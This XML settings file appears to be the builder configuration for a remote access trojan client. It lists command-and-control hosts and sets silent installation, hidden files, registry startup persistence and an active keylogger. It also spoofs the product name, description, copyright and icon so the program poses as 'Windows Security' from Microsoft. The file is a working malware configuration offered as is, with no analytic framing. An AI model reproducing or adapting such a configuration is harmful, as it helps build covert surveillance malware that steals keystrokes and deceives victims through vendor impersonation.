<settings>
  <Tag>Office007</Tag>
  <Hosts>192.168.0.1:3389;192.168.0.1:80;192.168.0.106:80;</Hosts>
  <Delay>3000</Delay>
  <Mutex>41fb3726-2f37-4693-961b-6b0d513960ae</Mutex>
  <UnattendedMode>True</UnattendedMode>
  <InstallClient>True</InstallClient>
  <InstallName>Windows Netover</InstallName>
  <InstallPath>3</InstallPath>
  <InstallSub>Windows Netover</InstallSub>
  <HideFile>True</HideFile>
  <HideSubDirectory>True</HideSubDirectory>
  <AddStartup>True</AddStartup>
  <RegistryName>Windows Netover</RegistryName>
  <ChangeIcon>True</ChangeIcon>
  <IconPath>C:\Users\Administrator\Desktop\新建文件夹\41.ico</IconPath>
  <ChangeAsmInfo>True</ChangeAsmInfo>
  <Keylogger>True</Keylogger>
  <LogDirectoryName>Logs</LogDirectoryName>
  <HideLogDirectory>False</HideLogDirectory>
  <ProductName>Windows Netover</ProductName>
  <Description>Windows Security</Description>
  <CompanyName>Microsoft Netsatpus</CompanyName>
  <Copyright>@Microsoft</Copyright>
  <Trademarks>Microsoft</Trademarks>
  <OriginalFilename>Microsoft Netsat</OriginalFilename>
  <ProductVersion>9.6.0.1</ProductVersion>
  <FileVersion>9.6.0.1</FileVersion>
</settings>